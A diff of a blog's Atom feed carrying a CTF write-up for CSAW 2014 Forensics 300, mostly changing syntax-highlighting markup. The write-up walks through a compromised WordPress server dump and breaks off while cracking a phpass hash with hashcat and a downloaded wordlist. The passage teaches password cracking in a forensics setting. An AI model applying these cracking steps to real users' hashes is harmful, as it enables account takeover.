@@ -1,8 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh - CSAW</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/csaw.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-09-28T11:21:00-04:00</updated><entry><title>CSAW CTF 2014 - Forensics 300: "Fluffy No More"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-300-fluffy-no-more.html" rel="alternate"></link><published>2014-09-28T11:21:00-04:00</published><updated>2014-09-28T11:21:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-28:/csaw-ctf-2014-forensics-300-fluffy-no-more.html</id><summary type="html">&lt;p&gt;This is the fourth and the last of the forensics challenge in the CSAW CTF 2014 competition. It was much harder than the three before, but it was also much more interesting.&lt;/p&gt;
-&lt;p&gt;The challenge starts with the following text:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;This is the fourth and the last of the forensics challenge in the CSAW CTF 2014 competition. It was much harder than the three before, but it was also much more interesting.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/csaw.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-09-28T11:21:00-04:00</updated><entry><title>CSAW CTF 2014 - Forensics 300: "Fluffy No More"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-300-fluffy-no-more.html" rel="alternate"></link><updated>2014-09-28T11:21:00-04:00</updated><author><name>Mia von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-28:csaw-ctf-2014-forensics-300-fluffy-no-more.html</id><summary type="html">&lt;p&gt;This is the fourth and the last of the forensics challenge in the CSAW CTF 2014 competition. It was much harder than the three before, but it was also much more interesting.&lt;/p&gt;
 &lt;p&gt;The challenge starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner.
@@ -14,68 +11,68 @@ Life was grand for the fluff fanatic until one day the site's users started to g
 &lt;p&gt;Oh, no! Nobody should mess with fluffy bunnies! Ever! Let's find how this attack happened!&lt;/p&gt;
 &lt;h2&gt;Inspecting the Directories&lt;/h2&gt;
 &lt;p&gt;We start by checking the identity of the file with the command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;. We do this to make sure that the extension is not misleading:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file CSAW2014-FluffyNoMore-v0.1.tar.bz2
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file CSAW2014-FluffyNoMore-v0.1.tar.bz2
 CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block &lt;span class="nv"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 900k
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;OK, cool, we can go ahead and unzip the &lt;em&gt;bzip2&lt;/em&gt; (compressed) tarball:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tar --help &lt;span class="p"&gt;|&lt;/span&gt; grep bz
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar --help | grep bz
   -j, --bzip2                filter the archive through bzip2
-$ tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
+&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now let's take a look inside the folder:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tree CSAW2014-FluffyNoMore-v0.1
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tree CSAW2014-FluffyNoMore-v0.1
 CSAW2014-FluffyNoMore-v0.1
 ├── etc_directory.tar.bz2
 ├── logs.tar.bz2
 ├── mysql_backup.sql.bz2
 └── webroot.tar.bz2
 
-&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
+0 directories, 4 files
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;All right, 4 more tarballs. Unziping and organizing them give us the following directories:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- etc/
-- var/log and var/www
-- mysql_backup.sql ([MySQL database dump file])
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
+&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;
+&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;mysql_backup&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sql&lt;/span&gt; &lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt; &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="n"&gt;dump&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This is the directory structure of a  &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;, where LAMP stands for Linux-Apache-MySQL-PHP in the &lt;a href="http://www.tldp.org/LDP/intro-linux/html/sect_03_01.html"&gt;Linux File System&lt;/a&gt;. In this framework, the PHP/HTML/JavaScript webpage is placed inside &lt;code&gt;var/www&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;The directory &lt;code&gt;var/&lt;/code&gt; contains files that are expected to change in size and content as the system is running (var stands for variable). So it is natural that system log files are generally placed at &lt;code&gt;/var/log&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Finally, the &lt;code&gt;etc/&lt;/code&gt; directory contains the system configuration files. For example, the file &lt;code&gt;resolv.conf&lt;/code&gt; tells the system where to go on the network to obtain host name to IP address mappings (DNS). Another example is the file  &lt;code&gt;passwd&lt;/code&gt;, which stores login information.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Before Anything else...&lt;/h2&gt;
 &lt;p&gt;OK, based on the previous challenges, we need to give a try:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ grep -r -l &lt;span class="s2"&gt;&amp;quot;key{&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;key{&amp;quot;&lt;/span&gt;
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 
-$ grep -r -l &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
+&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Is our life this easy??? No, of course not. The hits we got are just funny names to mislead us, for example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
+&lt;div class="highlight"&gt;&lt;pre&gt; -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Analyzing the MySQL Dump File&lt;/h2&gt;
 &lt;p&gt;Let's start taking a look at &lt;code&gt;mysql_backup.sql&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Of course, no luck for:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat mysql_backup.sql &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat mysql_backup.sql | grep &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Fine. We open &lt;code&gt;mysql_backup.sql&lt;/code&gt; in a text editor. The comments table shows that someone named "hacker" made an appearance:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;-- MySQL dump 10.13  Distrib 5.5.38, for debian-linux-gnu (i686)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;-- MySQL dump 10.13  Distrib 5.5.38, for debian-linux-gnu (i686)&lt;/span&gt;
 &lt;span class="c1"&gt;--&lt;/span&gt;
 &lt;span class="c1"&gt;-- Host: localhost    Database: wordpress&lt;/span&gt;
 &lt;span class="c1"&gt;-- ------------------------------------------------------&lt;/span&gt;
@@ -94,32 +91,32 @@ webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/include
 
 
 &lt;p&gt;Searching for the host &lt;strong&gt;secretspace.com&lt;/strong&gt; leads to some generic website. Inspecting its source code does not give us any hint either. Maybe its IP address?&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dig secretspace.com
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;dig secretspace.com
 
-&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.9.4-P2-RedHat-9.9.4-15.P2.fc20 &amp;lt;&amp;lt;&amp;gt;&amp;gt; secretspace.com
-&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
-&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
-&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: &lt;span class="m"&gt;61131&lt;/span&gt;
-&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr rd ra ad&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;1&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;0&lt;/span&gt;
+; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 &amp;lt;&amp;lt;&amp;gt;&amp;gt; secretspace.com
+;; global options: +cmd
+;; Got answer:
+;; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: 61131
+;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
 
-&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
-&lt;span class="p"&gt;;&lt;/span&gt;secretspace.com.       IN  A
+;; QUESTION SECTION:
+;secretspace.com.       IN  A
 
-&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
-secretspace.com.    &lt;span class="m"&gt;285&lt;/span&gt; IN  A   &lt;span class="m"&gt;72&lt;/span&gt;.167.232.29
+;; ANSWER SECTION:
+secretspace.com.    285 IN  A   72.167.232.29
 
-&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;7&lt;/span&gt; msec
-&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.1#53&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Thu Sep &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:51:26 EDT &lt;span class="m"&gt;2014&lt;/span&gt;
-&lt;span class="p"&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class="m"&gt;49&lt;/span&gt;
+;; Query &lt;span class="nb"&gt;time&lt;/span&gt;: 7 msec
+;; SERVER: 10.0.0.1#53&lt;span class="o"&gt;(&lt;/span&gt;10.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
+;; WHEN: Thu Sep 25 15:51:26 EDT 2014
+;; MSG SIZE  rcvd: 49
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the source code. Wrong direction...&lt;/p&gt;
 &lt;p&gt;All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use &lt;a href="http://www.phpmyadmin.net/home_page/index.php"&gt;phpMyAdmin&lt;/a&gt;, which I showed how to install and to configure in my tutorial about setting up a &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;We open &lt;code&gt;localhost/phpmyadmin&lt;/code&gt; in our browser. First we go  to &lt;em&gt;Databases&lt;/em&gt; and then &lt;em&gt;Create Database&lt;/em&gt; with any name we want. Then we  &lt;em&gt;Import&lt;/em&gt; &lt;code&gt;`mysql_backup.sql&lt;/code&gt; to this database. All the tables are loaded. Let's use the &lt;em&gt;Search&lt;/em&gt; option to look for &lt;em&gt;key&lt;/em&gt; or &lt;em&gt;flag&lt;/em&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/tVOY1VJ.png"&gt;
-&lt;img alt="" src="http://i.imgur.com/jY7CbLZ.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/tVOY1VJ.png" /&gt;
+&lt;img alt="" src="http://i.imgur.com/jY7CbLZ.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Nope. Nothing in special. By the way, &lt;code&gt;`default_pingback_flag1&lt;/code&gt; is just a &lt;strong&gt;Wordpress&lt;/strong&gt; flag indicating the default status of ping backs when new blog posts are published.&lt;/p&gt;
 &lt;p&gt;Let's continue our search. If we look  inside each of the tables we find:&lt;/p&gt;
 &lt;ul&gt;
@@ -128,70 +125,70 @@ secretspace.com.    &lt;span class="m"&gt;285&lt;/span&gt; IN  A   &lt;span clas
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Oh, wait! We found a hashed password!
-&lt;img alt="" src="http://i.imgur.com/FiQONze.png"&gt;&lt;/p&gt;
+&lt;img alt="" src="http://i.imgur.com/FiQONze.png" /&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Cracking the Password&lt;/h2&gt;
 &lt;p&gt;We want to crack &lt;code&gt;$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1&lt;/code&gt; and for this we are going to use &lt;a href="http://hashcat.net/hashcat/"&gt;hashcat&lt;/a&gt;. If you are in &lt;a href="http://www.kali.org/"&gt;Kali&lt;/a&gt; or in any Debian distribution you can install it with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ apt-get hashcat
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;apt-get hashcat
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In Fedora, we need to download and unzip it:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://hashcat.net/files/hashcat-0.47.7z
-$ 7za e hashcat-0.47.7z
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;wget http://hashcat.net/files/hashcat-0.47.7z
+&lt;span class="nv"&gt;$ &lt;/span&gt;7za e hashcat-0.47.7z
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, we are going to perform a brute force attack so we need a list of passwords. If you are using Kali, you can find them with:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ locate wordlist
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;locate wordlist
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;If not, this is an example for you (it's always good to have several lists!):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://www.scovetta.com/download/500_passwords.txt
-$ head 500_passwords.txt
-&lt;span class="m"&gt;123456&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;wget http://www.scovetta.com/download/500_passwords.txt
+&lt;span class="nv"&gt;$ &lt;/span&gt;head 500_passwords.txt
+123456
 password
-&lt;span class="m"&gt;12345678&lt;/span&gt;
-&lt;span class="m"&gt;1234&lt;/span&gt;
-&lt;span class="m"&gt;12345&lt;/span&gt;
+12345678
+1234
+12345
 dragon
 qwerty
-&lt;span class="m"&gt;696969&lt;/span&gt;
+696969
 mustang
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Hashcat is awesome because it gives you a list of hash types:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    0 = MD5
-   10 = md5($pass.$salt)
-   20 = md5($salt.$pass)
-   30 = md5(unicode($pass).$salt)
-   40 = md5(unicode($pass).$salt)
-   50 = HMAC-MD5 (key = $pass)
-   60 = HMAC-MD5 (key = $salt)
-  100 = SHA1
-  110 = sha1($pass.$salt)
-  120 = sha1($salt.$pass)
-  130 = sha1(unicode($pass).$salt)
-  140 = sha1($salt.unicode($pass))
-  150 = HMAC-SHA1 (key = $pass)
-  160 = HMAC-SHA1 (key = $salt)
-  200 = MySQL
-  300 = MySQL4.1/MySQL5
-  400 = phpass, MD5(Wordpress), MD5(phpBB3)
-  500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
-  800 = SHA-1(Django)
-  (...)
+&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;
+   &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="mi"&gt;20&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="mi"&gt;30&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="mi"&gt;50&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;MD5&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;MD5&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA1&lt;/span&gt;
+  &lt;span class="mi"&gt;110&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;120&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;130&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;140&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+  &lt;span class="mi"&gt;150&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;SHA1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;pass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;160&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HMAC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;SHA1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;200&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQL&lt;/span&gt;
+  &lt;span class="mi"&gt;300&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQL4&lt;/span&gt;&lt;span class="mf"&gt;.1&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;MySQL5&lt;/span&gt;
+  &lt;span class="mi"&gt;400&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;phpass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Wordpress&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;phpBB3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="mi"&gt;500&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;md5crypt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Unix&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;FreeBSD&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Cisco&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;IOS&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;
+  &lt;span class="mi"&gt;800&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Django&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(...)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We choose 400 because we are dealing with Wordpress. We copy and paste the hash to a file &lt;em&gt;pass.hash&lt;/em&gt;. Then, we run:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./hashcat-cli64.bin -m &lt;span class="m"&gt;400&lt;/span&gt; -a &lt;span class="m"&gt;0&lt;/span&gt; -o cracked.txt --remove  pass.hash word_list.txt
